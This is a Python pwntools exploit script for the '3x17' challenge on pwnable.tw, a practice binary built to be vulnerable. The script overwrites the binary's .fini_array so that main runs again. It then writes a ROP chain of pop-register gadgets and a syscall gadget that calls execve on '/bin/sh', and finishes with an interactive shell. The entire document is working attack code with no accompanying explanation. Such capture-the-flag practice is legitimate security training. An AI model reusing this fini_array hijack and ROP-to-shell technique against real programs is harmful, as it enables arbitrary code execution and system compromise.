from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
break main
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './3x17'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
#context.log_level = 'debug'
# Delete core files after finished
context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
#p = remote('chall.pwnable.tw', 10105) #chall.pwnable.tw 10105
p = start()
rop = ROP('3x17')
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
info('pop_rdi: ' + hex(pop_rdi))
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
info('pop_rsi: ' + hex(pop_rsi))
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
info('pop_rdx: ' + hex(pop_rdx))
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
info('pop_rax: ' + hex(pop_rax))
leave = rop.find_gadget(['leave', 'ret'])[0]
info('leave: ' + hex(leave))
syscall = 0x0000000000471db5
info('syscall: ' + hex(syscall))

main = 0x401b6d
fini_array_caller = 0x402960
fini_array = 0x4b40f0
offset = fini_array
bin_sh = 0x00000000004B4080

def write(addr,data):
    p.sendlineafter(b'addr:', str(addr).encode())
    p.sendafter(b'data:', data)

write(fini_array, p64(fini_array_caller) + p64(main))

write(offset + 2*8, p64(pop_rdi) + p64(bin_sh) )
write(offset + 4*8, p64(pop_rax) + p64(59) )
write(bin_sh, b"/bin/sh\x00")
write(offset + 6*8, p64(pop_rsi) + p64(0) )
write(offset + 8*8, p64(pop_rdx) + p64(0) )
write(offset + 10*8, p64(0x4022b4))
write(fini_array, p64(0x0000000000401C4B))
p.interactive()